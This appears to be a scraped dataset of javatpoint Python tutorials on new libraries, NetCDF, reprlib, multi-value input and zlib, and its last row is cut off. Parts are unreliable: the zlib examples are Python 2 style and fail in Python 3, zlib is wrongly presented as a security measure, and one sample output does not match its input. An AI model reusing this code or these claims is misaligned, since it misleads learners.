460,['Python Top 10 Libraries to Learn in 2022'],"['In the programming world, Python is the most demanded and efficient programming language. There are many reasons that make Python a much-demanded language. One thing that attracts people is its incredible extensibility. Python provides thousands of libraries which reduces the number of lines. Python has a huge community worldwide, and its community has been continuously updating its features and libraries.']","['https://www.javatpoint.com/reading-netcdf-data-using-python', 'https://www.javatpoint.com/how-to-generate-uuid-in-python', 'https://www.javatpoint.com/reading-netcdf-data-using-python', 'https://www.javatpoint.com/how-to-generate-uuid-in-python', 'https://www.javatpoint.com/reading-netcdf-data-using-python']","['https://static.javatpoint.com/python/images/python-top-10-libraries-to-learn-in-2022-1.png', 'https://static.javatpoint.com/python/images/python-top-10-libraries-to-learn-in-2022-2.png', 'https://static.javatpoint.com/python/images/python-top-10-libraries-to-learn-in-2022-3.png', 'https://static.javatpoint.com/python/images/python-top-10-libraries-to-learn-in-2022-4.png', 'https://static.javatpoint.com/python/images/python-top-10-libraries-to-learn-in-2022-5.png', 'https://static.javatpoint.com/python/images/python-top-10-libraries-to-learn-in-2022-6.png', 'https://static.javatpoint.com/python/images/python-top-10-libraries-to-learn-in-2022-7.png']",[],"['Top Python Libraries', 'Bonus Library', 'Conclusion']","['1. Awkward Array', '2. Gradio', '3. Hub', '4. AugLy', '5. jupytext', '6. Evidently', '7. LightGBM', '8. Django Ninja', '9. SQLModel', '10. Scalene', 'Jina and Finetuner']",[],"['Bonus Library', 'But Numpy arrays are lack in expressing variable-length structures. Although, we can set dtype to object, this is not enough.', ""We take the reference from the official documentation of the awkward library. Let's understand the following example -"", 'As we can see, both code snippets have generated the same output, but the second took a single line. It is much faster and uses less memory.', 'Radio allows us to create the web UI specific to our machine learning model.', 'Users can modify the application by changing parameters using sliders, uploading images, writing text, and recording voice.', 'No doubt, Gradio makes the model more accessible, which is the most important for the data scientist.', 'The infrastructure code is also essential to deal with the important qualities of data.', 'Evidently, it can generate visual reports that the data scientists can cross-check to ensure everything is working fine.']","[""In this tutorial, we will discuss Python Top 10 libraries that launched earlier. We haven't listed the typical libraries that everybody knows (pandas, pytorch, numpy, or Tensorflow)."", 'We are listing some of top Python libraries that can be quite popular in upcoming years and provide a scale up in career. Below are the top 10 libraries of Python that are newly launched.', 'AugLy is used to train robust models in computer vision. Getting the most important insight from labeled data is very important. Moreover, data augmented is a core of various disciplines that have greatly advanced SOTA in 2021.', 'A team of ML engineers and data scientists creates a machine learning model and hat model receives and sends data effortlessly. But at the time of the production, many things can go wrong. This can happen for many reasons.', 'On the other hand, the Fine tuner allows us to set up the fine-tune to the neural network representation to fetch the most appropriate results for the neural search tasks.']","['Most of us might be familiar with the numpy and its array. That is the main data structure in numpy and a grid of value. Numpy array allows vectorized operations over the data part, which influences parallelism and optimization in low-level libraries. Hence, they can execute much faster than Python for a loop.', 'In this scenario, an Awkward library can help us. Awkward arrays might seem like the regular array underneath; they are nested, tree-like data structures (JSON). They are similar to Numpy arrays, such as storing the data in the contiguous memory. They are operated using the compiled, vectorized code.', 'If you belong to the data science field, you must be familiar with Streamlight. Streamlight enables data scripts into shareable web apps so that user can demo their output as an actual app, not a Jupiter Notebook. Grades are the fastest way to demo the machine learning model with a friendly web interface. It makes the demo of ML builder easier and faster than Streamlight.', 'There is a general perception; usually, data scientists spend most of their time tuning models or planning about the best approach to novel problems. That is wrong; Data Scientist spends most of their time fetching data, arranging incorrect format, and writing boilerplate code.', 'Hub is a dataset format with a simple API used to store, create and collaborate on AI datasets of any size. We can store any dataset without worrying about the data size. Hub is used by many tech giants like Google, Waymo, Oxford University, Red Cross, and Omdena.', ""Hub comes with the build-in integration for Pytorch and Tensorflow. It stores data in the compressed format (chucked arrays). We can also store any storage option such as AWS S3, a GCP bucket, or can consider the local storage. Hub works lazily means the data is only fetched when needed. One of the main advantages is that we don't need multi-TB to work with the multi-TB datasets."", ' AugLy was invented by Meta (Facebook), a data augmentations library that currently supports four modalities (audio, image, text, and video) and more than 100 augmentations. We can configure the augmentations with metadata and compress them to get the desired result.', ""AugLy library is designed to utilize for augmenting our data in model training. There are many other libraries in flipping, resizing, or color jittering. Let's take a real-life example of the Aug library - Turn an image into a meme, overlay text/emojis on images/videos, change some images into the Instagram filter, etc."", ""The Jupyter notebook is a very useful tool, but we don't want to write data in a web browser. It is a demerit of the Jupyter notebook. Moreover, it also creates problems in version control. Jupytext eliminates such limitations and allows us to save notebooks as markdowns or scripts in several languages. It provides the result in plain text, making it easy to share them in version control. Other people can merge changes and even use IDEs and their nice autocomplete. It is a must-have tool for a data scientist in 2022."", 'It is an open-source Python package used to estimate and explore data drift for machine learning models. Instead of detecting anomalies in data, it helps us detect data drift and target drift. It helps to evaluate ML models during validation and monitor them in production.', 'LightGBM is a most effective and gradient-boosting machine learning framework that uses tree-based learning algorithms. It allows the programmers to use the redefined elementary models and decision trees and develop new algorithms. Many other libraries, such as XGBoost and CatBoost, can apply the same approach, but LightGBM comes with some advanced advantages. It offers optimal speed and memory usage and gives better accuracy. This library is capable of large-scale handling data.', 'Django is a most popular and battery-included framework that is used to build web applications. If developer wants to create a RESTful APIs, they move toward Django Rest Framework. But there is new contender known as Django Ninja. It is a fast web framework for building APIs with Django. Django Ninja provides the straightforward way to create APIs where we can get type casting and validation for our parameters. It is used by multiple companies on live projects. It is also integrated with the Django and ORM so that we can easily take the advantage of Python/Django.', 'SQLModel is a library that interacts with the SQL database using the Python code with Python objects. It is based on Python annotations and is supported by Pydantic and SQLAlchemy. It provides great support for editors and takes them less time in debugging. This library is quite easy and user-friendly. The main advantage is that; it has excellent compatibility with FastAPI, Pydantic, and SQLAlchemy. If you are familiar with the basic knowledge of databases, you can easily get known with this library.', ""Scalene is a high-performing memory GPU/CPU profiler integrated that can do several things. It is equipped to handle the multi-threaded code and delivers far better details than other profilers. While using it, we don't need to make the changes in the script and can execute the script from the scalene command. It simply gives the result in the form of an HTML document or a text to track the CPU and memory used for each line of code."", 'Most of us are using search engines like Google, but have you ever noticed how search engines are getting better than they were a few years ago. Something revolutionary happens behind the scene that is slowly replacing the traditional way of keyword-based search.', ""A new way of searching is known as Neural Search. The neural search feeds the entire text to the neural networks, which turns into vectors. To simplify, in a keyword-based search, texts are spat into discrete tokens and used that for matching. The neural search won't only limit to text data. It can be implemented with any data type (images, audio, and video)."", 'The Jina comes with a revolutionary solution that empowers developers to build scalable deep learning search applications in minutes. It provides the facility to implement neural search systems, both from a code and deployment perspective. It is scalable and cloud-native.', 'There are several other popular and useful libraries could be milestones in tech fields. But we have explained a few important, common libraries and which can be widely used in near future. Python is the most common language used for Data science activities. Most of the mentioned tools would be used by the Python expert to enhance the product quality.']","['import awkward as ak', 'array = ak.Array([', '[{""x"": 1.1, ""y"": [1]}, {""x"": 2.2, ""y"": [1, 2]}, {""x"": 3.3, ""y"": [1, 2, 3]}],', '[],', '[{""x"": 4.4, ""y"": [1, 2, 3, 4]}, {""x"": 5.5, ""y"": [1, 2, 3, 4, 5]}]', 'import numpy as np', 'output = []', 'for sublist in array:', 'tmp1 = []', 'for record in sublist:', 'tmp2 = []', 'for number in record[""y""][1:]:', 'tmp2.append(np.square(number))', 'tmp1.append(tmp2)', 'output.append(tmp1)', 'output = np.square(array[""y"", ..., 1:])', 'print(output)']","['[[[], [4], [4, 9]], [], [[4, 9, 16], [4, 9, 16, 25]]]', '[[[], [4], [4, 9]], [], [[4, 9, 16], [4, 9, 16, 25]]]']",[],['|||Awkward Array|||AugLy|||Gradily|||Hub|||Jupytext|||Evidently|||LightBGM|||Django Ninja|||SQLModel|||Scalene||||||Jina and Finetuner||||||Using regular Python for loop||||||Using Awkward Array|||']
461,['Reading NetCDF Data using Python'],"['In the following tutorial, we will understand how to read NetCDF Data with the help of the Python programming language.']","['https://www.javatpoint.com/reprlib-module-in-python', 'https://www.javatpoint.com/python-top-10-libraries-to-learn-in-2022', 'https://www.javatpoint.com/reprlib-module-in-python', 'https://www.javatpoint.com/python-top-10-libraries-to-learn-in-2022', 'https://www.javatpoint.com/reprlib-module-in-python']",[],[],"['Understanding NetCDF', 'Installation', 'Loading a NetCDF Dataset', 'Conclusion']","['Verifying the Installation', 'General File Structure', 'Accessing Metadata', 'Dimensions', 'Variable Metadata']",[],"['But before we get started, let us briefly understand what exactly NetCDF is.', 'Once the module is installed, we can verify it by creating an empty Python program file and writing an import statement as follows:', 'File: verify.py', 'Now, save the above file and execute it using the following command in a terminal:', 'Let us consider the following snippet of code demonstrating the same:', 'Explanation:', 'Printing the dataset provides us information regarding the variables stored in the file along with their dimension.', 'Let us consider the following snippet of code demonstrating the same.', 'Explanation:', 'We can also access the Metadata as a Python dictionary, which is more helpful. Let us consider the following example demonstrating the same.', 'Explanation:', 'We can then access any metadata element using its key. Let us consider the following example demonstrating the same:', 'Explanation:', 'In the above snippet of code, we have specified the key and printed the resulting value for the users.', 'Explanation:', ""We can also access individual dimensions like so: dSet.dimensions['x']."", 'We can access variable metadata in a similar way as dimensions. Let us consider the following snippet of code demonstrating the same.', 'Explanation:', 'We can also access the individual variables. Let us consider the following example demonstrating the same:', 'Explanation:', 'In the above snippet of code, we have printed the value of the prcp variable by specifying it as a parameter to the dSet variable.']","['We can read the NetCDF files using different Python modules. Some of such famous modules include netCDF4 and gdal. For this tutorial, we will mainly focus on the netCDF4 module.', 'The process of installing the module is simple. We can either use the pip installer or the anaconda Python distribution. The syntax to install the netCDF4 module using the pip installer is shown below:', 'We can also use the anaconda Python distribution in order to eliminate the confusion that can come with dependencies and versioning. The syntax to install the module using anaconda (conda) is shown below:', 'Loading a dataset is quite easy. All we have to do is pass a NetCDF file path to the netCDF4.Dataset() function. For this tutorial, we will be using a file consisting of climate data.', 'In the above snippet of code, we have imported the required module. We have then specified the path to the NetCDF file. We have then converted the data of the NetCDF file to the dataset using the Dataset() function.', 'The netCDF4 module enables us to access the metadata and data related to a NetCDF file. A NetCDF file consists of three basic segments: metadata, dimensions, and variables. Variables consist of both metadata and data.']","['Network common data form (also known as NetCDF) is generally utilized to store multi-dimensional geographic data. Some examples of these data can be precipitation, temperature, and wind speed. Variables stored in NetCDF are usually measured more than once per day over large (continental) areas. With more than one measurement per day, data values accumulate quickly and become unwieldy to work with. Data management is further complicated when each value is also assigned to a geographic location. NetCDF offers a solution for these challenges. This tutorial will get you to begin reading data from the NetCDF file using the modules in the Python programming language.', 'If the above Python program file does not return any error, the module is installed properly. However, in the case where an exception is raised, try reinstalling the module, and it is also recommended to refer to the official documentation of the module.', 'In the above snippet of code, we have used the print() function to print the dataset for the users. As we can observe, the above information includes the file format, data source, data version, citation, dimensions, and variables. The variables we are interested in are lat, lon, time, and prcp (precipitation). We can find the precipitation at a specific location for a given time with these variables. This file only consists of 31-time steps (the time dimension is 31).', 'In the above snippet of code, we have imported the required module and defined the path to the NetCDF file. We have then used the Dataset() function to create the dataset of the file. At last, we have converted the data into a dictionary and printed the resultant data for the users.', 'Accessing dimensions is similar to file metadata. Each dimension is stored as a dimension class which consists of pertinent information. We can access the Metadata for all dimensions by looping through all available dimensions. Let us consider the following snippet of code demonstrating the same.', 'In the following snippet of code, we have imported the required libraries and defined the path to the NetCDF file. We have then used the Dataset() function to create a dataset of the file. At last, we have printed the dimensions of the dataset using the for-loop iterating through each dimension given in the dataset.', 'In the above snippet of code, we have imported the required module and defined the path to the NetCDF file. We have then used the Dataset() function to create the dataset of the file. At last, we have used the for-loop to iterate through the variables of the dataset and print them for users.', 'NetCDF files are generally utilized for geographic time-series data. Initially, they can be quite intimidating to work with due to the large amounts of data and the different formats from the CSV and raster files that are most utilized. NetCDF is a great manner of documenting geographic data because of the built-in documentation and metadata. This makes it easy for end-users to understand exactly what the data represent with little ambiguity. NetCDF data are accessed as NumPy arrays, which present many possibilities for analysis and incorporation to existing utilities and workflows.']","['$ pip install netCDF4', '$ conda install netCDF4', 'import netCDF4 as nc', '$ python verify.py', '# importing the required module', 'import netCDF4 as nc', '# defining the path to file', ""filePath = 'sample.nc'"", '# using the Dataset() function', 'dSet = nc.Dataset(filePath)', '# printing the dataset', 'print(dSet)', '# importing the required module', 'import netCDF4 as nc', '# defining the path to file', ""filePath = 'sample.nc'"", '# using the Dataset() function', 'dSet = nc.Dataset(filePath)', '# printing the metadata as a dictionary', 'print(dSet.__dict__)', '# importing the required module', 'import netCDF4 as nc', '# defining the path to file', ""filePath = 'sample.nc'"", '# using the Dataset() function', 'dSet = nc.Dataset(filePath)', '# printing the metadata as a dictionary', ""print(dSet.__dict__['start_year'])"", '# importing the required module', 'import netCDF4 as nc', '# defining the path to file', ""filePath = 'sample.nc'"", '# using the Dataset() function', 'dSet = nc.Dataset(filePath)', '# printing the dimensions of the dataset', 'for dimension in dSet.dimensions.values():', 'print(dimension)', '# importing the required module', 'import netCDF4 as nc', '# defining the path to file', ""filePath = 'sample.nc'"", '# using the Dataset() function', 'dSet = nc.Dataset(filePath)', '# printing the variables of the dataset', 'for variable in dSet.variables.values():', 'print(variable)', '# importing the required module', 'import netCDF4 as nc', '# defining the path to file', ""filePath = 'sample.nc'"", '# using the Dataset() function', 'dSet = nc.Dataset(filePath)', '# printing the value of the prcp variable', ""print(dSet['prcp'])""]","[""<class 'netCDF4._netCDF4.Dataset'>"", 'root group (NETCDF4 data model, file format HDF5):', 'start_year: 2021', 'month: 01', 'source: Daymet Software Version 4.0', 'Version_software: Daymet Software Version 4.0', 'Version_data: Daymet Data Version 4.0', 'Conventions: CF-1.6', 'citation: Please see http://daymet.ornl.gov/ for current Daymet data citation information', 'references: Please see http://daymet.ornl.gov/ for current information on Daymet references', 'dimensions(sizes): x(284), y(584), time(31), nv(2)', 'variables(dimensions): float32 x(x), float32 y(y), float32 lat(y, x), float32 lon(y, x), float32 time(time), int16 yearday(time), float32 time_bnds(time, nv), int16 lambert_conformal_conic(), float32 prcp(time, y, x)', 'groups:', ""{'start_year': 2021, 'month': '01', 'source': 'Daymet Software Version 4.0', 'Version_software': 'Daymet Software Version 4.0', 'Version_data': 'Daymet Data Version 4.0', 'Conventions': 'CF-1.6', 'citation': 'Please see http://daymet.ornl.gov/ for current Daymet data citation information', 'references': 'Please see http://daymet.ornl.gov/ for current information on Daymet references'}"", '2021', ""<class 'netCDF4._netCDF4.Dimension'>: name = 'x', size = 284"", ""<class 'netCDF4._netCDF4.Dimension'>: name = 'y', size = 584"", ""<class 'netCDF4._netCDF4.Dimension'> (unlimited): name = 'time', size = 31"", ""<class 'netCDF4._netCDF4.Dimension'>: name = 'nv', size = 2"", ""<class 'netCDF4._netCDF4.Variable'>"", 'float32 x(x)', 'units: m', 'long_name: x coordinate of projection', 'standard_name: projection_x_coordinate', 'unlimited dimensions:', 'current shape = (284,)', 'filling on, default _FillValue of 9.969209968386869e+36 used', ""<class 'netCDF4._netCDF4.Variable'>"", 'float32 y(y)', 'units: m', 'long_name: y coordinate of projection', 'standard_name: projection_y_coordinate', 'unlimited dimensions:', 'current shape = (584,)', 'filling on, default _FillValue of 9.969209968386869e+36 used', ""<class 'netCDF4._netCDF4.Variable'>"", 'float32 lat(y, x)', 'units: degrees_north', 'long_name: latitude coordinate', 'standard_name: latitude', 'unlimited dimensions:', 'current shape = (584, 284)', 'filling on, default _FillValue of 9.969209968386869e+36 used', ""<class 'netCDF4._netCDF4.Variable'>"", 'float32 lon(y, x)', 'units: degrees_east', 'long_name: longitude coordinate', 'standard_name: longitude', 'unlimited dimensions:', 'current shape = (584, 284)', 'filling on, default _FillValue of 9.969209968386869e+36 used', ""<class 'netCDF4._netCDF4.Variable'>"", 'float32 time(time)', 'standard_name: time', 'calendar: standard', 'units: days since 1950-01-01 00:00:00', 'bounds: time_bnds', 'long_name: 24-hour day based on local time', 'unlimited dimensions: time', 'current shape = (31,)', 'filling on, default _FillValue of 9.969209968386869e+36 used', ""<class 'netCDF4._netCDF4.Variable'>"", 'int16 yearday(time)', 'long_name: day of year (DOY) starting with day 1 on January 1st', 'unlimited dimensions: time', 'current shape = (31,)', 'filling on, default _FillValue of -32767 used', ""<class 'netCDF4._netCDF4.Variable'>"", 'float32 time_bnds(time, nv)', 'unlimited dimensions: time', 'current shape = (31, 2)', 'filling on, default _FillValue of 9.969209968386869e+36 used', ""<class 'netCDF4._netCDF4.Variable'>"", 'int16 lambert_conformal_conic()', 'grid_mapping_name: lambert_conformal_conic', 'longitude_of_central_meridian: -100.0', 'latitude_of_projection_origin: 42.5', 'false_easting: 0.0', 'false_northing: 0.0', 'standard_parallel: [25. 60.]', 'semi_major_axis: 6378137.0', 'inverse_flattening: 298.257223563', 'unlimited dimensions:', 'current shape = ()', 'filling on, default _FillValue of -32767 used', ""<class 'netCDF4._netCDF4.Variable'>"", 'float32 prcp(time, y, x)', '_FillValue: -9999.0', 'long_name: daily total precipitation', 'units: mm/day', 'missing_value: -9999.0', 'coordinates: lat lon', 'grid_mapping: lambert_conformal_conic', 'cell_methods: area: mean time: sum', 'unlimited dimensions: time', 'current shape = (31, 584, 284)', 'filling on', ""<class 'netCDF4._netCDF4.Variable'>"", 'float32 prcp(time, y, x)', '_FillValue: -9999.0', 'long_name: daily total precipitation', 'units: mm/day', 'missing_value: -9999.0', 'coordinates: lat lon', 'grid_mapping: lambert_conformal_conic', 'cell_methods: area: mean time: sum', 'unlimited dimensions: time', 'current shape = (31, 584, 284)', 'filling on']",[],[]
462,['The reprlib module in Python'],"['In the following tutorial, we will understand the reprlib module in the Python programming language with the help of examples.']","['https://www.javatpoint.com/how-to-take-multiple-input-from-user-in-python', 'https://www.javatpoint.com/reading-netcdf-data-using-python', 'https://www.javatpoint.com/how-to-take-multiple-input-from-user-in-python', 'https://www.javatpoint.com/reading-netcdf-data-using-python', 'https://www.javatpoint.com/how-to-take-multiple-input-from-user-in-python']",[],[],['Understanding the reprlib module in Python'],['Understanding the Repr Objects'],[],"[""So, let's get started."", 'This module offers a class, an instance, and a function.', 'class reprlib.Repr', 'reprlib.aRepr', 'reprlib.repr(obj)', ""@reprlib.recursive_repr(fillvalue = '…')"", 'Let us consider the following demonstrating the same:', 'Explanation:', 'There are some other max limits for dict, lists, tuples, sets, array and many more.', 'Let us consider an example demonstrating the use of the Repr objects.', 'Explanation:']","['The Python reprlib module offers a means for producing object representations with limits on the size of the resulting strings. This is used in the Python debugger and may be beneficial in other contexts.', 'aRepr is an object of Repr, which is utilized to offer the repr() function shown below. Altering the attributes of this object will affect the size limits utilized by the repr() function and the Python debugger.', 'repr() is a method of aRepr. However, this method returns a string similar to that returned by the built-in function of the same name, with limits on most sizes.', 'Moreover, along with the size-limiting tools, this module also offers a decorator to detect recursive calls to __repr__() and substitute a placeholder string.', 'This is a decorator for the __repr__() methods to detect recursive calls inside the same thread. In case a recursive call is made, the fillvalue is returned; else the usual __repr__() call is made.', 'Repr objects offer different attributes, which we can use to provide size limits to represent different object types, and methods that format specific object types.']","['This Class offers the formatting services beneficial for the implementation of functions similar to the built-in the repr() function. This class also has size limits for various object types to avoid the generation of excessively long representations.', 'In the above snippet of code, we have imported the required module and defined a class as TheList. We have then used the decorator and defined the function as __repr__() that returns the fillvalue. We have then instantiated the class and appended elements to the list. At last, we have printed the list.', 'In the above snippet of code, we have imported the required libraries and defined a list containing the factorials of numbers ranging from 0 to 100. and printed the value of the repr() function. We created the Repr object and set the long size to 15 using the maxlong object type. At last, we have again printed the result of the repr() function.']","['# importing the required module', 'from reprlib import recursive_repr', '# defining the class', 'class TheList(list):', '# using the decorator', '@recursive_repr()', '# defining the function', 'def __repr__(self):', ""return '<' + '|'.join(map(repr, self)) + '>'"", '# instantiating the class', ""one = TheList('abc')"", '# appending elements to the list', 'one.append(one)', ""one.append('x')"", '# printing the final list', 'print(one)', '# importing the required modules', 'import reprlib', 'import math', '# creating a list of factorials using the functions of the math library', 'factList = [math.factorial(x) for x in range(100)]', 'print(reprlib.repr(factList))', '# creating the Repr object and set long size to 15', 'myRept = reprlib.Repr()', '# using maxlong', 'myRept.maxlong = 15', 'print(myRept.repr(factList[53]))']","[""<'a'|'b'|'c'|...|'x'>"", '[1, 1, 2, 6, 24, 120, ...]', '427488...000000']","['S. No.|||Methods/Variables|||Descriptions&&&1|||Repr.maxlevel|||This object type represents the depth limit for the recursive representation. The default value is 6.&&&2|||Repr.maxlong|||This object type consists of the maximum number to represent the long value. The default value is 40.&&&3|||Repr.maxstring|||This object type limits the number of characters in a string-type object. The default value is 30.&&&4|||Repr.maxother|||This object type limits the size of some other data, where formatting is not specified. &&&5|||Repr.repr(obj)|||This method serves the same purpose as the built-in repr() method.&&&6|||Repr.repr1(obj, level)|||This method is a recursive implementation of the repr() method. Moreover, we have to specify the level for the recursive output.']",[]
463,['How to take Multiple Input from User in Python'],"['It is a common problem for the beginners. It may ask in the interview. Sometimes, the developers also need to take the multiple inputs in a single line. It can be easily done in the C/C++ using the scanf() method. However, Python provides the two methods that help us to take multiple values or input in one line.']","['https://www.javatpoint.com/python-zlib-library', 'https://www.javatpoint.com/reprlib-module-in-python', 'https://www.javatpoint.com/python-zlib-library', 'https://www.javatpoint.com/reprlib-module-in-python', 'https://www.javatpoint.com/python-zlib-library']",[],[],"['Take Matrix Input from User', 'Using map() function and numpy Library', 'Conclusion']","['Using split() Method', 'Using List Comprehension']",[],"['In this tutorial, we will learn how to take multiple inputs in one line using various methods.', 'The split() method is useful for getting multiple inputs from users. The syntax is given below.', 'Parameters -', 'The split() method is used to split the Python string, but we can use it to get the multiple values.', ""Let's understand the following example."", 'Explanation - ', 'In the above code, we take the multiple inputs in a single line. The values are separated by the whitespace, you can use comma (,) or anything.', ""We can also take values and convert them into the list using the map() method along with the split() method. Let's understand the following example."", 'Example -2:', 'Explanation -', 'We used whitespace as a separator in the above code and taken the input in one line and type casted it into a list.', 'The above can be implemented in the one line as below.']","[""There is a popular library called Numpy which can use for any scientific computation. It provides the extensive support for multidimensional arrays. We will use this library for input matrix. Let's understand the following example."", 'In this tutorial, we have shown the different ways to take multiple values from the user. It saves the number of code lines and is quite easy to use. We have also described the same as a matrix where we can create a user-define matrix.']","[""Matrix is a rectangular array, or we can say rectangular arrangement of data or numbers. The matrix can take any value such as integer values, floating values, string, complex numbers, etc. The values are placed horizontally called rows, while vertical values are called 'columns'. If the matrix consists of r number of rows and c number of columns, the order of the matrix will be r x c.""]","['input().split(separator, maxsplit)', '# taking two inputs at a time', 'a, b, c = input(""Enter three values: "").split()', 'print(""Enter Your First Name: "", a)', 'print(""Enter Your Last Name: "", b)', 'print(""Enter Your Class: "", c)', 'print()', '# taking three inputs at a time', 'x, y, z = input(""Enter three values: "").split()', 'print(""Total number of students: "", x)', 'print(""Number of passed student : "", y)', 'print(""Number of failed student : "", z)', 'print()', '# taking four inputs at a time', 'a, b, c, d = input(""Enter four values: "").split()', 'print(""First number is {}, second number is {} third is {} and fourth is {}"".format(a, b, c, d))', 'print()', '# Taking multiple inputs in a single line', '# and type casting using list() function', 'x = list(map(int, input(""Enter multiple values: "").split()))', 'print(""List of students: "", x)', 'row = int(input(""Enter the number of rows:""))', 'column = int(input(""Enter the number of columns:""))', '# Initialize matrix', 'matrix = []', 'print(""Enter the entries row-wise:"")', '# For user input', 'for i in range(row):         # A for loop for row entries', 'a =[]', 'for j in range(column):  # A for loop for column entries', 'a.append(int(input()))', 'matrix.append(a)', '# For printing the matrix', 'for i in range(row):', 'for j in range(column):', 'print(matrix[i][j], end = "" "")', 'print()', 'row = int(input(""Enter the number of rows:""))', 'column = int(input(""Enter the number of columns:""))', 'matrix = [[int(input()) for x in range (column)] for y in range(row)]', 'print(matrix)', 'import numpy as np', 'row = int(input(""Enter the number of rows:""))', 'column = int(input(""Enter the number of columns:""))', 'print(""Enter the entries in a single line (separated by space): "")', '# User input of entries in a', '# single line separated by space', 'entries = list(map(int, input().split()))', '# For printing the matrix', 'matrix = np.array(entries).reshape(row, column)', 'print(matrix)']","['Enter three values: David Warner MCA', 'Enter Your First Name:  David', 'Enter Your Last Name:  Warner', 'Enter Your Class:  Warner', 'Enter three values: 100 67 33', 'Total number of students:  100', 'Number of passed students :  67', 'Number of failed students :  33', 'Enter four values: 1 2 3 4', 'First number is 1, second number is 2 third is 3 and fourth is 4', 'Enter multiple values: 4 6 7 2 4', 'List of students:  [4, 6, 7, 2, 4]', 'Enter multiple values: 4 6 7 2 4', 'List of values:  [4, 6, 7, 2, 4]', 'Enter the number of rows:3', 'Enter the number of columns:3', 'Enter the entries row-wise:', '1', '2', '3', '4', '5', '6', '7', '8', '9', '1 2 3', '4 5 6', '7 8 9', 'Enter the number of rows:3', 'Enter the number of columns:3', '1', '2', '3', '4', '5', '6', '7', '8', '9', '1 2 3', '4 5 6', '7 8 9', 'Enter the number of rows:2', 'Enter the number of columns:2', 'Enter the entries in a single line separated by space: 1 2 3 1', '[[1 2]', '[3 1]]']",[],"['|||Using split() method|||Using List Comprehension||||||The separator parameter breaks the input by the specified separator. By default, whitespace is the specified separator.|||']"
464,['Python zlib Library | what is zlib in Python?'],"['The zlib is a Python library that supports the zlib C library, a higher-level generalization for deflating lossless compression algorithms. The zlib library is used to lossless compress, which means there is no data loss between compression and decompression).']","['https://www.javatpoint.com/python-queue-module', 'https://www.javatpoint.com/how-to-take-multiple-input-from-user-in-python', 'https://www.javatpoint.com/python-queue-module', 'https://www.javatpoint.com/how-to-take-multiple-input-from-user-in-python', 'https://www.javatpoint.com/python-queue-module']",[],[],"['The compression() method', 'Compressing Large Data Streams', 'Compressing a File', 'Saving Compress Data to a File', 'Decompression', 'Decompressing Large Data Streams', 'Decompressing Data from a File', 'Conclusion']",[],[],"[""It also provides portability advantages across the different platforms and doesn't expand the data."", 'This library is well-suited with the gzip file format/tool, the most popular and useful compression application on UNIX systems.', 'The zlib library facilitates us to compress() method, which is used to compress a data string. Below is the syntax of the function.', 'Parameter -', ""Let's understand the below example."", 'If we change the value 2 to 0, then the result will be as below.', 'Parameters -', ""Let's understand the following example"", 'Explanation -', 'We will use the compression() method to compress the file. The syntax is similar as in the previous example.', 'In the below example, we will compress the PNG image ""mountain.png"".', ""Let's understand the following example."", 'We can also save the compressed data in a file for the further use. In the below example, we shows some compressed text into a file.', 'When we run the above program, it compresses the given string and saves the compressed data into a file named ""output.txt"".', 'Decompressing is also an important aspect of the application. The zlib library provides the decompress() method. Below is the syntax of it.', 'Parameters -', ""Let's understand the following example."", 'The syntax is as below.', 'The above method returns decompress object, which is used to decompress the particular data.', ""Let's understand the following example."", ""Let's understand the following example."", 'Explanation -']","['This library plays a very significant role in terms of security. Many applications require the compression and decompression of arbitrary data such as strings, files, or structured in-memory content.', 'The zlib library provides the comressobj() function to manage large data streams. This method returns the compression object. The syntax is given below.', 'It plays the significant role where the compression is required. With the help of compress.compress(data) method, we can compress and flush the chunk of data without accumulating full data in memory.', 'We have read the hello.dat that contains ""Welcome to JavaTpoint"". However, the file contains the a small string so we have used the decompress() instead of decompressobj() function.']","['We took a simple string value that is not a large data stream, it serves the purpose of showing the working of compressobj() function. The string ""Welcome to JavaTpoint"" has compressed. Generally, this method is used when the data streams are too large or won\'t fit into memory. This method plays essential role in a bigger application where we can configure the compression and can be used to compress portions of the data in series.', 'In the above example, we have used the Z_BEST_COMPRESSION, which is the best compression level this algorithm has to offer. In the next line, we calculate the level of compression based on the ratio of the compressed data length over the original data. The file is compressed by 13%, this is how to compress the ASCII string or binary image data.', 'While decompressing the large data stream, we may face the memory management issue due to the size or source of the data. There is a chance we may not utilize all of the available memory for that particular task. So that, the decompressobj() allows us to divide up a large stream in multiple chunks, which can be decompressed separately.', 'As we have discussed in previous examples, we can easily decompress the data contained in the file. This example is similar to the previous example; we get the data from the file, except that in this case, we will use the decompress() method. This method is useful when data is small enough to fit in the memory easily.', 'The Python zlib library is useful when the application requires compression at a security level. It comes with a bunch of excellent functions. We have discussed some important concepts of the zlib library, although many functions are available. The compress() and decompress() methods are used for the small data, whereas compressobj() and decompressobj() methods are available to provide more flexibility by supporting compression/decompression of data streams.']","['compress(data, level=-1)', 'import zlib', 'import binascii', ""value = 'Welcome to JavaTpoint'"", 'compressed_data = zlib.compress(value, 2)', ""print('Original data: ' +  value)"", ""print('Compressed data: ' + binascii.hexlify(compressed_data))"", 'Original data: Welcome to JavaTpoint', 'Compressed data: 785ef348cdc9c95728cf2fca49010018ab043d', 'compressobj(level=-1, method=DEFLATED, wbits=15, memLevel=8, strategy=Z_DEFAULT_STRATEGY[, zdict])', 'import zlib', 'import binascii', ""data = 'Welcome to JavaTpoint'"", 'compress = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)', 'compressed_data = compress.compress(data)', 'compressed_data += compress.flush()', ""print('Original: ' + data)"", ""print('Compressed data: ' + binascii.hexlify(compressed_data))"", 'import zlib', ""original_data = open(r'C:\\Users\\DEVANSH SHARMA\\Pictures\\Saved Pictures\\mountain.png', 'rb').read()"", 'compressed_data = zlib.compress(original_data, zlib.Z_BEST_COMPRESSION)', 'compress_ratio = (float(len(original_data)) - float(len(compressed_data))) / float(len(original_data))', ""print('Compressed: %d%%' % (100.0 * compress_ratio))"", 'import zlib', ""my_data = 'Welcome to JavaTpoint'"", 'compressed_data = zlib.compress(my_data, 2)', ""f = open('outfile.txt', 'w')"", 'f.write(compressed_data)', 'f.close()', 'decompress(data, wbits=MAX_WBITS, bufsize=DEF_BUF_SIZE)', 'import zlib', ""data = 'Welcome to JavaTpoint'"", 'compressed_data = zlib.compress(data, 2)', 'decompressed_data = zlib.decompress(compressed_data)', ""print('Decompressed data: ' + decompressed_data)"", 'decompressobj(wbits=15[, zdict])', 'import zlib', ""data = 'Welcome to JavaTpoint'"", 'compress = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, +15)', 'compressed_data = compress.compress(data)', 'compressed_data += compress.flush()', ""print('Data before Decompress: ' + data)"", ""print('Data After Decompress: ' + 